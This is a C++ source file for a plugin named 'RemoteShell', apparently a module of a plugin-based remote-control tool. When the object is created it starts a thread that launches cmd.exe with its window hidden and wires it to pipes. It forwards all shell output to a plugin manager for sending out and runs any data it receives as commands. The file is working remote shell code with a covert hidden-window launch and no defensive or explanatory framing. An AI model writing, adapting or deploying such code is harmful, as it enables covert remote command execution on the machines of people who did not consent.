#include "remoteshell.h"
#include <stdio.h>

int RemoteShell::threadReader(register RemoteShell *_this){
    if(_this){
        _this->shell = createShell();
        char* readData;
        _this->threadRuning = true;
        while(_this->threadRuning){
            ulong bytesRead = readShell(_this->shell,&readData);
            if(bytesRead){
                _this->mgr->sendData(readData,bytesRead);
                free(readData);
            }else Sleep(10);
        }
    }
    return 0;
}

RemoteShell::RemoteShell(){
    mgr = null;
    shell = null;
    hThreadReader = CreateThread(0,0,(LPTHREAD_START_ROUTINE)&threadReader,this,0,0);
}

RemoteShell::~RemoteShell(){
    TerminateThread(hThreadReader,0);
    deleteShell(shell);
}

const char *RemoteShell::getPluginName(){
    return "RemoteShell";
}

int RemoteShell::onReciveData(char *data, uint size){
    return writeShell(shell,data,size);
}

void RemoteShell::setPluginManager(pluginManagerInterface *mgr){
    this->mgr = mgr;
}

PluginInterface* getInterface(){
    return new RemoteShell();
}

Shell* createShell(){
    SECURITY_ATTRIBUTES attrib;
    Shell* shell = (Shell*)malloc(sizeof(Shell));

    ZeroMemory(shell,sizeof(*shell));
    ZeroMemory(&attrib,sizeof(attrib));

    attrib.bInheritHandle = true;
    attrib.nLength = sizeof(attrib);

    CreatePipe(&shell->hRead,&shell->startInfo.hStdOutput,&attrib,0);
    CreatePipe(&shell->startInfo.hStdInput,&shell->hWrite,&attrib,0);
    shell->startInfo.hStdError = shell->startInfo.hStdOutput;

    shell->startInfo.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;

    CHAR cmdPath[MAX_PATH];
    GetSystemDirectoryA(cmdPath,MAX_PATH);
    lstrcatA(cmdPath,"\\cmd.exe /d /Q /U");

    CreateProcess(0,cmdPath,0,0,TRUE,0,0,0,&shell->startInfo,&shell->ProcessInformation);
    Sleep(500);

    return shell;
}

bool deleteShell(Shell* shell){
    TerminateProcess(shell->ProcessInformation.hProcess,0);
    CloseHandle(shell->hRead);
    CloseHandle(shell->hWrite);
    CloseHandle(shell->startInfo.hStdInput);
    CloseHandle(shell->startInfo.hStdOutput);
    return true;
}

int writeShell(Shell* shell,char* str,uint size){
    printf("%S\n",(wchar_t*)str);
    WriteFile(shell->hWrite,str,size,(ulong*)&size,0);
    //WriteFile(shell->hWrite,"\r\n",lstrlen("\r\n"),&size,0);

    return size;
}

int readShell(Shell* shell,char** buff){
    ulong BytesRead;
    PeekNamedPipe(shell->hRead,0,0,0,&BytesRead,0);

    *buff = (char*)malloc(BytesRead+1);
    (*buff)[BytesRead] = 0;

    ReadFile(shell->hRead,*buff,BytesRead,&BytesRead,0);
    printf("%S\n",(wchar_t*)*buff);
    return BytesRead;
}
